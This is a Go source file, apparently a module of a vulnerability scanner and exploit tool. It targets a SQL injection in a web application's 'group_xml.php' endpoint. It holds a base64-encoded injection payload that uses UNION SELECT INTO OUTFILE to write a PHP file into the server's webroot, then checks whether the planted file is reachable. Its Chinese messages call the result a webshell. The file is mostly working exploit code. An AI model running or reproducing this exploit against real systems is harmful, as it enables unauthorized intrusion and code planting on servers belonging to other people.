package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wo01 struct {
}

func (s *Wo01) Scan(targetUrl string) {
	vulnerable, err := Wo01scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wo01] 存在group_xml SQL注入")
	} else {
		color.White("[Wo01] 不存在group_xml SQL注入")
	}
}

func (*Wo01) Exploit(targetUrl string) {
	runResult, err := Wo01runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wo01scancore(targetUrl string) (bool, error) {
	url := "/inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxXQ"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "tree") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wo01runcore(targetUrl string) (string, error) {
	url := "/inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd"
	webshellurl := "/vulntest.php"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resp1, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + webshellurl)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	resContent1 := resp1.String()
	if strings.Contains(resContent1, "system") {
		return "存在group_xml SQL注入 成功写入webshell:\n" + targetUrl + webshellurl, nil
	} else if strings.Contains(resContent, "MySQL") {
		return "存在group_xml SQL注入 写入webshell失败\n" + resContent, nil
	} else {
		return "", nil
	}
}
